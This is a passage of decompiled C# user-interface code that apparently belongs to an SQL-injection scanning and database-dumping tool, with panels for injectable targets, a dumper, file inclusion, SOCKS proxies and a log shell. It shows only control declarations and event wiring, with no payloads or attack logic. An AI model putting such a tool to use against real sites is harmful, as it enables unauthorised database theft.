	internal virtual ToolStripLabel lblSQLi { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000428 RID: 1064
	// (get) Token: 0x06000D15 RID: 3349 RVA: 0x0000759F File Offset: 0x0000579F
	// (set) Token: 0x06000D16 RID: 3350 RVA: 0x000075A7 File Offset: 0x000057A7
	internal virtual Panel pnlSQLiNoInjectable { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000429 RID: 1065
	// (get) Token: 0x06000D17 RID: 3351 RVA: 0x000075B0 File Offset: 0x000057B0
	// (set) Token: 0x06000D18 RID: 3352 RVA: 0x000075B8 File Offset: 0x000057B8
	internal virtual ToolStrip tsSQLiNoInjectable { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700042A RID: 1066
	// (get) Token: 0x06000D19 RID: 3353 RVA: 0x000075C1 File Offset: 0x000057C1
	// (set) Token: 0x06000D1A RID: 3354 RVA: 0x000075C9 File Offset: 0x000057C9
	internal virtual ToolStripComboBox cmbSQLiNoInjectableSearch { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700042B RID: 1067
	// (get) Token: 0x06000D1B RID: 3355 RVA: 0x000075D2 File Offset: 0x000057D2
	// (set) Token: 0x06000D1C RID: 3356 RVA: 0x00057A74 File Offset: 0x00055C74
	internal virtual ToolStripButton btnSQLiNoInjectableSearchClear
	{
		[CompilerGenerated]
		get
		{
			return this._btnSQLiNoInjectableSearchClear;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_172);
			ToolStripButton btnSQLiNoInjectableSearchClear = this._btnSQLiNoInjectableSearchClear;
			if (btnSQLiNoInjectableSearchClear != null)
			{
				btnSQLiNoInjectableSearchClear.Click -= value2;
			}
			this._btnSQLiNoInjectableSearchClear = value;
			btnSQLiNoInjectableSearchClear = this._btnSQLiNoInjectableSearchClear;
			if (btnSQLiNoInjectableSearchClear != null)
			{
				btnSQLiNoInjectableSearchClear.Click += value2;
			}
		}
	}

	// Token: 0x1700042C RID: 1068
	// (get) Token: 0x06000D1D RID: 3357 RVA: 0x000075DA File Offset: 0x000057DA
	// (set) Token: 0x06000D1E RID: 3358 RVA: 0x00057AB8 File Offset: 0x00055CB8
	internal virtual ToolStripButton btnSQLiNoInjectableSearch
	{
		[CompilerGenerated]
		get
		{
			return this._btnSQLiNoInjectableSearch;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_172);
			ToolStripButton btnSQLiNoInjectableSearch = this._btnSQLiNoInjectableSearch;
			if (btnSQLiNoInjectableSearch != null)
			{
				btnSQLiNoInjectableSearch.Click -= value2;
			}
			this._btnSQLiNoInjectableSearch = value;
			btnSQLiNoInjectableSearch = this._btnSQLiNoInjectableSearch;
			if (btnSQLiNoInjectableSearch != null)
			{
				btnSQLiNoInjectableSearch.Click += value2;
			}
		}
	}

	// Token: 0x1700042D RID: 1069
	// (get) Token: 0x06000D1F RID: 3359 RVA: 0x000075E2 File Offset: 0x000057E2
	// (set) Token: 0x06000D20 RID: 3360 RVA: 0x000075EA File Offset: 0x000057EA
	internal virtual ToolStripSeparator ToolStripSeparator13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700042E RID: 1070
	// (get) Token: 0x06000D21 RID: 3361 RVA: 0x000075F3 File Offset: 0x000057F3
	// (set) Token: 0x06000D22 RID: 3362 RVA: 0x000075FB File Offset: 0x000057FB
	internal virtual ToolStripLabel lblSQLiNoInjectable { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700042F RID: 1071
	// (get) Token: 0x06000D23 RID: 3363 RVA: 0x00007604 File Offset: 0x00005804
	// (set) Token: 0x06000D24 RID: 3364 RVA: 0x0000760C File Offset: 0x0000580C
	internal virtual Panel pnlSQLiDumper { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000430 RID: 1072
	// (get) Token: 0x06000D25 RID: 3365 RVA: 0x00007615 File Offset: 0x00005815
	// (set) Token: 0x06000D26 RID: 3366 RVA: 0x00057AFC File Offset: 0x00055CFC
	internal virtual ToolStripButton btnSocksMyIP
	{
		[CompilerGenerated]
		get
		{
			return this._btnSocksMyIP;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_96);
			ToolStripButton btnSocksMyIP = this._btnSocksMyIP;
			if (btnSocksMyIP != null)
			{
				btnSocksMyIP.CheckedChanged -= value2;
			}
			this._btnSocksMyIP = value;
			btnSocksMyIP = this._btnSocksMyIP;
			if (btnSocksMyIP != null)
			{
				btnSocksMyIP.CheckedChanged += value2;
			}
		}
	}

	// Token: 0x17000431 RID: 1073
	// (get) Token: 0x06000D27 RID: 3367 RVA: 0x0000761D File Offset: 0x0000581D
	// (set) Token: 0x06000D28 RID: 3368 RVA: 0x00007625 File Offset: 0x00005825
	internal virtual ToolStrip tsSearchColumn { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000432 RID: 1074
	// (get) Token: 0x06000D29 RID: 3369 RVA: 0x0000762E File Offset: 0x0000582E
	// (set) Token: 0x06000D2A RID: 3370 RVA: 0x00007636 File Offset: 0x00005836
	internal virtual ToolStripButton btnSearchColumnStart { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000433 RID: 1075
	// (get) Token: 0x06000D2B RID: 3371 RVA: 0x0000763F File Offset: 0x0000583F
	// (set) Token: 0x06000D2C RID: 3372 RVA: 0x00007647 File Offset: 0x00005847
	internal virtual ToolStripButton chkSearchColumnAllDBs { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000434 RID: 1076
	// (get) Token: 0x06000D2D RID: 3373 RVA: 0x00007650 File Offset: 0x00005850
	// (set) Token: 0x06000D2E RID: 3374 RVA: 0x00057B40 File Offset: 0x00055D40
	internal virtual ToolStripComboBox cmbSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return this._cmbSearchColumn;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_176);
			ToolStripComboBox cmbSearchColumn = this._cmbSearchColumn;
			if (cmbSearchColumn != null)
			{
				cmbSearchColumn.Leave -= value2;
			}
			this._cmbSearchColumn = value;
			cmbSearchColumn = this._cmbSearchColumn;
			if (cmbSearchColumn != null)
			{
				cmbSearchColumn.Leave += value2;
			}
		}
	}

	// Token: 0x17000435 RID: 1077
	// (get) Token: 0x06000D2F RID: 3375 RVA: 0x00007658 File Offset: 0x00005858
	// (set) Token: 0x06000D30 RID: 3376 RVA: 0x00057B84 File Offset: 0x00055D84
	internal virtual ContextMenuStrip mnuSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return this._mnuChecked_9;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler value2 = new CancelEventHandler(this.method_177);
			ContextMenuStrip mnuChecked_ = this._mnuChecked_9;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening -= value2;
			}
			this._mnuChecked_9 = value;
			mnuChecked_ = this._mnuChecked_9;
			if (mnuChecked_ != null)
			{
				mnuChecked_.Opening += value2;
			}
		}
	}

	// Token: 0x17000436 RID: 1078
	// (get) Token: 0x06000D31 RID: 3377 RVA: 0x00007660 File Offset: 0x00005860
	// (set) Token: 0x06000D32 RID: 3378 RVA: 0x00057BC8 File Offset: 0x00055DC8
	internal virtual ToolStripMenuItem mnuSearchColumnClear
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSearchColumnClear;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_180);
			ToolStripMenuItem mnuSearchColumnClear = this._mnuSearchColumnClear;
			if (mnuSearchColumnClear != null)
			{
				mnuSearchColumnClear.Click -= value2;
			}
			this._mnuSearchColumnClear = value;
			mnuSearchColumnClear = this._mnuSearchColumnClear;
			if (mnuSearchColumnClear != null)
			{
				mnuSearchColumnClear.Click += value2;
			}
		}
	}

	// Token: 0x17000437 RID: 1079
	// (get) Token: 0x06000D33 RID: 3379 RVA: 0x00007668 File Offset: 0x00005868
	// (set) Token: 0x06000D34 RID: 3380 RVA: 0x00057C0C File Offset: 0x00055E0C
	internal virtual ToolStripMenuItem mnuSearchColumnRem
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSearchColumnRem;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_179);
			ToolStripMenuItem mnuSearchColumnRem = this._mnuSearchColumnRem;
			if (mnuSearchColumnRem != null)
			{
				mnuSearchColumnRem.Click -= value2;
			}
			this._mnuSearchColumnRem = value;
			mnuSearchColumnRem = this._mnuSearchColumnRem;
			if (mnuSearchColumnRem != null)
			{
				mnuSearchColumnRem.Click += value2;
			}
		}
	}

	// Token: 0x17000438 RID: 1080
	// (get) Token: 0x06000D35 RID: 3381 RVA: 0x00007670 File Offset: 0x00005870
	// (set) Token: 0x06000D36 RID: 3382 RVA: 0x00057C50 File Offset: 0x00055E50
	internal virtual ToolStripMenuItem mnuLWGoDumper
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWGoDumper;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_164);
			ToolStripMenuItem mnuLWGoDumper = this._mnuLWGoDumper;
			if (mnuLWGoDumper != null)
			{
				mnuLWGoDumper.Click -= value2;
			}
			this._mnuLWGoDumper = value;
			mnuLWGoDumper = this._mnuLWGoDumper;
			if (mnuLWGoDumper != null)
			{
				mnuLWGoDumper.Click += value2;
			}
		}
	}

	// Token: 0x17000439 RID: 1081
	// (get) Token: 0x06000D37 RID: 3383 RVA: 0x00007678 File Offset: 0x00005878
	// (set) Token: 0x06000D38 RID: 3384 RVA: 0x00057C94 File Offset: 0x00055E94
	internal virtual ToolStripMenuItem mnuLWGoNewDumper
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWGoNewDumper;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_163);
			ToolStripMenuItem mnuLWGoNewDumper = this._mnuLWGoNewDumper;
			if (mnuLWGoNewDumper != null)
			{
				mnuLWGoNewDumper.Click -= value2;
			}
			this._mnuLWGoNewDumper = value;
			mnuLWGoNewDumper = this._mnuLWGoNewDumper;
			if (mnuLWGoNewDumper != null)
			{
				mnuLWGoNewDumper.Click += value2;
			}
		}
	}

	// Token: 0x1700043A RID: 1082
	// (get) Token: 0x06000D39 RID: 3385 RVA: 0x00007680 File Offset: 0x00005880
	// (set) Token: 0x06000D3A RID: 3386 RVA: 0x00007688 File Offset: 0x00005888
	internal virtual ToolStripSeparator mnuLWGoNewDumperSP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700043B RID: 1083
	// (get) Token: 0x06000D3B RID: 3387 RVA: 0x00007691 File Offset: 0x00005891
	// (set) Token: 0x06000D3C RID: 3388 RVA: 0x00057CD8 File Offset: 0x00055ED8
	internal virtual ToolStripMenuItem mnuLWGoFileDumper
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWGoFileDumper;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_166);
			ToolStripMenuItem mnuLWGoFileDumper = this._mnuLWGoFileDumper;
			if (mnuLWGoFileDumper != null)
			{
				mnuLWGoFileDumper.Click -= value2;
			}
			this._mnuLWGoFileDumper = value;
			mnuLWGoFileDumper = this._mnuLWGoFileDumper;
			if (mnuLWGoFileDumper != null)
			{
				mnuLWGoFileDumper.Click += value2;
			}
		}
	}

	// Token: 0x1700043C RID: 1084
	// (get) Token: 0x06000D3D RID: 3389 RVA: 0x00007699 File Offset: 0x00005899
	// (set) Token: 0x06000D3E RID: 3390 RVA: 0x000076A1 File Offset: 0x000058A1
	internal virtual ContextMenuStrip mnuDownloads { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700043D RID: 1085
	// (get) Token: 0x06000D3F RID: 3391 RVA: 0x000076AA File Offset: 0x000058AA
	// (set) Token: 0x06000D40 RID: 3392 RVA: 0x00057D1C File Offset: 0x00055F1C
	internal virtual ToolStripMenuItem mnuDownloadsClear
	{
		[CompilerGenerated]
		get
		{
			return this._mnuDownloadsClear;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_211);
			ToolStripMenuItem mnuDownloadsClear = this._mnuDownloadsClear;
			if (mnuDownloadsClear != null)
			{
				mnuDownloadsClear.Click -= value2;
			}
			this._mnuDownloadsClear = value;
			mnuDownloadsClear = this._mnuDownloadsClear;
			if (mnuDownloadsClear != null)
			{
				mnuDownloadsClear.Click += value2;
			}
		}
	}

	// Token: 0x1700043E RID: 1086
	// (get) Token: 0x06000D41 RID: 3393 RVA: 0x000076B2 File Offset: 0x000058B2
	// (set) Token: 0x06000D42 RID: 3394 RVA: 0x00057D60 File Offset: 0x00055F60
	internal virtual ToolStripComboBox txtFileInclusaoSearch
	{
		[CompilerGenerated]
		get
		{
			return this._txtFileInclusaoSearch;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyPressEventHandler value2 = new KeyPressEventHandler(this.method_171);
			ToolStripComboBox txtFileInclusaoSearch = this._txtFileInclusaoSearch;
			if (txtFileInclusaoSearch != null)
			{
				txtFileInclusaoSearch.KeyPress -= value2;
			}
			this._txtFileInclusaoSearch = value;
			txtFileInclusaoSearch = this._txtFileInclusaoSearch;
			if (txtFileInclusaoSearch != null)
			{
				txtFileInclusaoSearch.KeyPress += value2;
			}
		}
	}

	// Token: 0x1700043F RID: 1087
	// (get) Token: 0x06000D43 RID: 3395 RVA: 0x000076BA File Offset: 0x000058BA
	// (set) Token: 0x06000D44 RID: 3396 RVA: 0x00057DA4 File Offset: 0x00055FA4
	internal virtual ToolStripComboBox txtSQLiNoInjectableSearch
	{
		[CompilerGenerated]
		get
		{
			return this._txtSQLiNoInjectableSearch;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyPressEventHandler value2 = new KeyPressEventHandler(this.method_171);
			ToolStripComboBox txtSQLiNoInjectableSearch = this._txtSQLiNoInjectableSearch;
			if (txtSQLiNoInjectableSearch != null)
			{
				txtSQLiNoInjectableSearch.KeyPress -= value2;
			}
			this._txtSQLiNoInjectableSearch = value;
			txtSQLiNoInjectableSearch = this._txtSQLiNoInjectableSearch;
			if (txtSQLiNoInjectableSearch != null)
			{
				txtSQLiNoInjectableSearch.KeyPress += value2;
			}
		}
	}

	// Token: 0x17000440 RID: 1088
	// (get) Token: 0x06000D45 RID: 3397 RVA: 0x000076C2 File Offset: 0x000058C2
	// (set) Token: 0x06000D46 RID: 3398 RVA: 0x00057DE8 File Offset: 0x00055FE8
	internal virtual ToolStripComboBox txtSQLiSearch
	{
		[CompilerGenerated]
		get
		{
			return this._txtSQLiSearch;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyPressEventHandler value2 = new KeyPressEventHandler(this.method_171);
			ToolStripComboBox txtSQLiSearch = this._txtSQLiSearch;
			if (txtSQLiSearch != null)
			{
				txtSQLiSearch.KeyPress -= value2;
			}
			this._txtSQLiSearch = value;
			txtSQLiSearch = this._txtSQLiSearch;
			if (txtSQLiSearch != null)
			{
				txtSQLiSearch.KeyPress += value2;
			}
		}
	}

	// Token: 0x17000441 RID: 1089
	// (get) Token: 0x06000D47 RID: 3399 RVA: 0x000076CA File Offset: 0x000058CA
	// (set) Token: 0x06000D48 RID: 3400 RVA: 0x000076D2 File Offset: 0x000058D2
	internal virtual ToolStripLabel lblSocksCount { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000442 RID: 1090
	// (get) Token: 0x06000D49 RID: 3401 RVA: 0x000076DB File Offset: 0x000058DB
	// (set) Token: 0x06000D4A RID: 3402 RVA: 0x00057E2C File Offset: 0x0005602C
	internal virtual ToolStripMenuItem mnuLWAutoScroll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWAutoScroll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_170);
			ToolStripMenuItem mnuLWAutoScroll = this._mnuLWAutoScroll;
			if (mnuLWAutoScroll != null)
			{
				mnuLWAutoScroll.Click -= value2;
			}
			this._mnuLWAutoScroll = value;
			mnuLWAutoScroll = this._mnuLWAutoScroll;
			if (mnuLWAutoScroll != null)
			{
				mnuLWAutoScroll.Click += value2;
			}
		}
	}

	// Token: 0x17000443 RID: 1091
	// (get) Token: 0x06000D4B RID: 3403 RVA: 0x000076E3 File Offset: 0x000058E3
	// (set) Token: 0x06000D4C RID: 3404 RVA: 0x00057E70 File Offset: 0x00056070
	internal virtual ToolStripMenuItem mnuQueueTrash
	{
		[CompilerGenerated]
		get
		{
			return this._mnuQueueTrash;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_155);
			ToolStripMenuItem mnuQueueTrash = this._mnuQueueTrash;
			if (mnuQueueTrash != null)
			{
				mnuQueueTrash.Click -= value2;
			}
			this._mnuQueueTrash = value;
			mnuQueueTrash = this._mnuQueueTrash;
			if (mnuQueueTrash != null)
			{
				mnuQueueTrash.Click += value2;
			}
		}
	}

	// Token: 0x17000444 RID: 1092
	// (get) Token: 0x06000D4D RID: 3405 RVA: 0x000076EB File Offset: 0x000058EB
	// (set) Token: 0x06000D4E RID: 3406 RVA: 0x00057EB4 File Offset: 0x000560B4
	internal virtual ToolStripMenuItem mnuLWTrash
	{
		[CompilerGenerated]
		get
		{
			return this._mnuLWTrash;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_168);
			ToolStripMenuItem mnuLWTrash = this._mnuLWTrash;
			if (mnuLWTrash != null)
			{
				mnuLWTrash.Click -= value2;
			}
			this._mnuLWTrash = value;
			mnuLWTrash = this._mnuLWTrash;
			if (mnuLWTrash != null)
			{
				mnuLWTrash.Click += value2;
			}
		}
	}

	// Token: 0x17000445 RID: 1093
	// (get) Token: 0x06000D4F RID: 3407 RVA: 0x000076F3 File Offset: 0x000058F3
	// (set) Token: 0x06000D50 RID: 3408 RVA: 0x000076FB File Offset: 0x000058FB
	internal virtual ToolStripSeparator mnuLWAutoScrollSP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000446 RID: 1094
	// (get) Token: 0x06000D51 RID: 3409 RVA: 0x00007704 File Offset: 0x00005904
	// (set) Token: 0x06000D52 RID: 3410 RVA: 0x0000770C File Offset: 0x0000590C
	internal virtual ToolStripMenuItem mnuLWSelected { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000447 RID: 1095
	// (get) Token: 0x06000D53 RID: 3411 RVA: 0x00007715 File Offset: 0x00005915
	// (set) Token: 0x06000D54 RID: 3412 RVA: 0x0000771D File Offset: 0x0000591D
	internal virtual CheckBox chkAnalizerOracleErrorUnion { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000448 RID: 1096
	// (get) Token: 0x06000D55 RID: 3413 RVA: 0x00007726 File Offset: 0x00005926
	// (set) Token: 0x06000D56 RID: 3414 RVA: 0x0000772E File Offset: 0x0000592E
	internal virtual CheckBox chkAnalizerPostgreErrorUnion { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000449 RID: 1097
	// (get) Token: 0x06000D57 RID: 3415 RVA: 0x00007737 File Offset: 0x00005937
	// (set) Token: 0x06000D58 RID: 3416 RVA: 0x0000773F File Offset: 0x0000593F
	internal virtual CheckBox chkAnalizeMsAcessSybase { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700044A RID: 1098
	// (get) Token: 0x06000D59 RID: 3417 RVA: 0x00007748 File Offset: 0x00005948
	// (set) Token: 0x06000D5A RID: 3418 RVA: 0x00057EF8 File Offset: 0x000560F8
	internal virtual ToolStripMenuItem mnuHttpLogShell
	{
		[CompilerGenerated]
		get
		{
			return this._mnuHttpLogShell;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_203);
			ToolStripMenuItem mnuHttpLogShell = this._mnuHttpLogShell;
			if (mnuHttpLogShell != null)
			{
				mnuHttpLogShell.Click -= value2;
			}
			this._mnuHttpLogShell = value;
			mnuHttpLogShell = this._mnuHttpLogShell;
			if (mnuHttpLogShell != null)
			{
				mnuHttpLogShell.Click += value2;
			}
		}
	}

	// Token: 0x1700044B RID: 1099
	// (get) Token: 0x06000D5B RID: 3419 RVA: 0x00007750 File Offset: 0x00005950
	// (set) Token: 0x06000D5C RID: 3420 RVA: 0x00057F3C File Offset: 0x0005613C
	internal virtual ToolStripMenuItem mnuHttpLogClipboard
	{
		[CompilerGenerated]
		get
		{
			return this._mnuHttpLogClipboard;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_202);
			ToolStripMenuItem mnuHttpLogClipboard = this._mnuHttpLogClipboard;
			if (mnuHttpLogClipboard != null)
			{
				mnuHttpLogClipboard.Click -= value2;
			}
			this._mnuHttpLogClipboard = value;
			mnuHttpLogClipboard = this._mnuHttpLogClipboard;
			if (mnuHttpLogClipboard != null)
			{
				mnuHttpLogClipboard.Click += value2;
			}
		}
	}

	// Token: 0x1700044C RID: 1100
	// (get) Token: 0x06000D5D RID: 3421 RVA: 0x00007758 File Offset: 0x00005958
	// (set) Token: 0x06000D5E RID: 3422 RVA: 0x00007760 File Offset: 0x00005960
	internal virtual Panel pnlTools { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700044D RID: 1101
	// (get) Token: 0x06000D5F RID: 3423 RVA: 0x00007769 File Offset: 0x00005969
	// (set) Token: 0x06000D60 RID: 3424 RVA: 0x00057F80 File Offset: 0x00056180
	internal virtual Button btnPing
	{
		[CompilerGenerated]
		get
		{
			return this._btnPing;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_140);
			Button btnPing = this._btnPing;
			if (btnPing != null)
			{
				btnPing.Click -= value2;
			}
			this._btnPing = value;
			btnPing = this._btnPing;
			if (btnPing != null)
			{
				btnPing.Click += value2;
			}
		}
	}

	// Token: 0x1700044E RID: 1102
	// (get) Token: 0x06000D61 RID: 3425 RVA: 0x00007771 File Offset: 0x00005971
	// (set) Token: 0x06000D62 RID: 3426 RVA: 0x00007779 File Offset: 0x00005979
	internal virtual GroupBox grbToolsIP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700044F RID: 1103
	// (get) Token: 0x06000D63 RID: 3427 RVA: 0x00007782 File Offset: 0x00005982
	// (set) Token: 0x06000D64 RID: 3428 RVA: 0x00057FC4 File Offset: 0x000561C4
	internal virtual Button btnResolve
	{
		[CompilerGenerated]
		get
		{
			return this._btnResolve;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_142);
			Button btnResolve = this._btnResolve;
			if (btnResolve != null)
			{
				btnResolve.Click -= value2;
			}
			this._btnResolve = value;
			btnResolve = this._btnResolve;
			if (btnResolve != null)
			{
				btnResolve.Click += value2;
			}
		}
	}

	// Token: 0x17000450 RID: 1104
	// (get) Token: 0x06000D65 RID: 3429 RVA: 0x0000778A File Offset: 0x0000598A
	// (set) Token: 0x06000D66 RID: 3430 RVA: 0x00007792 File Offset: 0x00005992
	internal virtual TextBox txtResolveCountry { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000451 RID: 1105
	// (get) Token: 0x06000D67 RID: 3431 RVA: 0x0000779B File Offset: 0x0000599B
	// (set) Token: 0x06000D68 RID: 3432 RVA: 0x000077A3 File Offset: 0x000059A3
	internal virtual TextBox txtResolveIP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000452 RID: 1106
	// (get) Token: 0x06000D69 RID: 3433 RVA: 0x000077AC File Offset: 0x000059AC
	// (set) Token: 0x06000D6A RID: 3434 RVA: 0x000077B4 File Offset: 0x000059B4
	internal virtual PictureBox picResolveFlag { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000453 RID: 1107
	// (get) Token: 0x06000D6B RID: 3435 RVA: 0x000077BD File Offset: 0x000059BD
	// (set) Token: 0x06000D6C RID: 3436 RVA: 0x000077C5 File Offset: 0x000059C5
	internal virtual Label lblToolsIPAddress { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000454 RID: 1108
	// (get) Token: 0x06000D6D RID: 3437 RVA: 0x000077CE File Offset: 0x000059CE
	// (set) Token: 0x06000D6E RID: 3438 RVA: 0x000077D6 File Offset: 0x000059D6
	internal virtual Label lblToolsIP { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000455 RID: 1109
	// (get) Token: 0x06000D6F RID: 3439 RVA: 0x000077DF File Offset: 0x000059DF
	// (set) Token: 0x06000D70 RID: 3440 RVA: 0x000077E7 File Offset: 0x000059E7
	internal virtual Label lblToolsIPCountry { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000456 RID: 1110
	// (get) Token: 0x06000D71 RID: 3441 RVA: 0x000077F0 File Offset: 0x000059F0
	// (set) Token: 0x06000D72 RID: 3442 RVA: 0x00058008 File Offset: 0x00056208
	internal virtual TextBox txtResolveAddress
	{
		[CompilerGenerated]
		get
		{
			return this._txtResolveAddress;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_141);
			TextBox txtResolveAddress = this._txtResolveAddress;
			if (txtResolveAddress != null)
			{
				txtResolveAddress.TextChanged -= value2;
			}
			this._txtResolveAddress = value;
			txtResolveAddress = this._txtResolveAddress;
			if (txtResolveAddress != null)
			{
				txtResolveAddress.TextChanged += value2;
			}
		}
	}

	// Token: 0x17000457 RID: 1111
	// (get) Token: 0x06000D73 RID: 3443 RVA: 0x000077F8 File Offset: 0x000059F8
	// (set) Token: 0x06000D74 RID: 3444 RVA: 0x00007800 File Offset: 0x00005A00
	internal virtual NumericUpDown numPingPort { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000458 RID: 1112
	// (get) Token: 0x06000D75 RID: 3445 RVA: 0x00007809 File Offset: 0x00005A09
	// (set) Token: 0x06000D76 RID: 3446 RVA: 0x00007811 File Offset: 0x00005A11
	internal virtual ComboBox cmbSQLChar { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x17000459 RID: 1113
	// (get) Token: 0x06000D77 RID: 3447 RVA: 0x0000781A File Offset: 0x00005A1A
	// (set) Token: 0x06000D78 RID: 3448 RVA: 0x0005804C File Offset: 0x0005624C
	internal virtual TextBox txtSQLCharDelimiter
	{
		[CompilerGenerated]
		get
		{
			return this._txtSQLCharDelimiter;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_139);
			TextBox txtSQLCharDelimiter = this._txtSQLCharDelimiter;
			if (txtSQLCharDelimiter != null)
			{
				txtSQLCharDelimiter.TextChanged -= value2;
			}
			this._txtSQLCharDelimiter = value;
			txtSQLCharDelimiter = this._txtSQLCharDelimiter;
			if (txtSQLCharDelimiter != null)
			{
				txtSQLCharDelimiter.TextChanged += value2;
			}
		}
	}

	// Token: 0x1700045A RID: 1114
	// (get) Token: 0x06000D79 RID: 3449 RVA: 0x00007822 File Offset: 0x00005A22
	// (set) Token: 0x06000D7A RID: 3450 RVA: 0x00058090 File Offset: 0x00056290
	internal virtual TextBox txtTextValue
	{
		[CompilerGenerated]
		get
		{
			return this._txtTextValue;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler value2 = new EventHandler(this.method_129);
			TextBox txtTextValue = this._txtTextValue;
			if (txtTextValue != null)
			{
				txtTextValue.TextChanged -= value2;
			}
			this._txtTextValue = value;
			txtTextValue = this._txtTextValue;
			if (txtTextValue != null)
			{
				txtTextValue.TextChanged += value2;
			}
		}
	}

	// Token: 0x1700045B RID: 1115
	// (get) Token: 0x06000D7B RID: 3451 RVA: 0x0000782A File Offset: 0x00005A2A
	// (set) Token: 0x06000D7C RID: 3452 RVA: 0x00007832 File Offset: 0x00005A32
	internal virtual TextBox txtSQLCharValue { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700045C RID: 1116
	// (get) Token: 0x06000D7D RID: 3453 RVA: 0x0000783B File Offset: 0x00005A3B
	// (set) Token: 0x06000D7E RID: 3454 RVA: 0x00007843 File Offset: 0x00005A43
	internal virtual Label lblToolsConverSQLChar { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700045D RID: 1117
